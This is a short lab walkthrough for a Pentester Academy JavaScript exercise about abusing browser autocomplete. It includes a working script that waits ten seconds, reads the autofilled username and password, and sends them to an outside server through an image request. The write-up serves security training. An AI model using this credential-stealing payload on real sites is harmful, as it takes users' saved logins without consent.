## Task 12 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/12)</small>

Objectives:

1. Enter a Username/Password and allow the browser to remember it
2. Reload the page so the auto-complete now adds the Username/Password automatically
3. Write JS attack code which waits for 10 seconds, then submits the form automatically to your Attack server

This is pretty interesting task. So basically in this we have to exploit the autocomplete feature provided by the modern browsers.

Time waits in javascript are provided by [setInterval](https://www.w3schools.com/jsref/met_win_setinterval.asp) and [setTimeout](https://www.w3schools.com/jsref/met_win_settimeout.asp)

In this case, we need setTimeout feature.

The input tags are not set to autocomplete. So we will do it at first

![](https://i.imgur.com/sC7bnlU.png)

```js
document.forms[0].autocomplete = "on";
setTimeout(() => {
  const e = document.querySelector("input[type=text]");
  const p = document.querySelector("input[type=password]");
  new Image().src = "https://mysite.com?e=" + e.value + "&p=" + p.value;
}, 10000);
```

For POC, [Click Here]()

**More Resources**

1. [setInterval vs setTimeout](https://stackoverflow.com/a/729943/10362396)
2. [Setting `autocomplete` property using javascript](https://www.w3schools.com/jsref/prop_form_autocomplete.asp)
